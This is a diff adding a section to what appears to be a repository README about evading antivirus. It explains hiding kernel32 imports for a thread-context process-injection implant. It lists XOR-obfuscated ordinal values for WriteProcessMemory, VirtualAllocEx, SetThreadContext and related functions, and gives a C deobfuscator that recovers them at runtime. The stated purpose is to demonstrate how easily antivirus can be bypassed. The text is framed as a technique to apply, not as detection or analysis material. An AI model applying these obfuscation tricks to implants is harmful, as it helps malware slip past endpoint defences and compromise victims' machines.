@@ -29,3 +29,41 @@ This is not real "mixed boolean arithmetics". It's just arithmetics actually.
 2. I did not use more convoluted tricks like shifting the bits or rotating them
 3. I kept it simple to demonstrate how to easily bypass antivirus
 
+# Applying simple mixed boolean arithmetics to a example implant (ThreadContext Injection)
+
+# Combination of IAT-hiding and ordinal load via mixed boolean arithmetics
+Use multiples of 0x1000 to ordinal load these and XOR it back
+
+1. XOR out the value to a multiple of 0x1000
+2. Compute the value of that multiple in a for-loop
+3. The final ordinal is resolved as the ordinals listed below
+4. Remember these are functions from kernel32.dll
+
+# (WriteProcessMemory) Remember that 99 is decimal, not hex, so #define XORKEY 99
+0x637 + 0x2000 = 0x2637^99 = 0x2654
+# (VirtualAllocEx)
+0x5e3 + 0x2000 = 0x25e3^99 = 0x2580
+# SetThreadContext
+0x56f p/x (0x2000+0x56f)^99 = 0x250c
+# SuspendThread
+0x5a1 p/x (0x2000+0x5a1)^99 = 0x25c2
+# GetThreadContext
+0x30d p/x (0x2000+0x30d)^99 = 0x236e 
+# SetThreadContext
+0x56f p/x (0x2000+0x56f)^99 = 0x250c
+# CreateToolhelp32Snapshot
+0x108 p/x (0x2000+0x108)^99 = 0x216b
+
+# Example deobfuscator before MAKEINTRESOURCE macro is used.
+```
+#define XORKEY 99
+
+int deobfuscate(int x) {
+    x ^= 99;
+    for (int i = 0; i < 0x2000; i++) {
+        x -= 0x1;
+    }
+    return x;
+}
+
+```
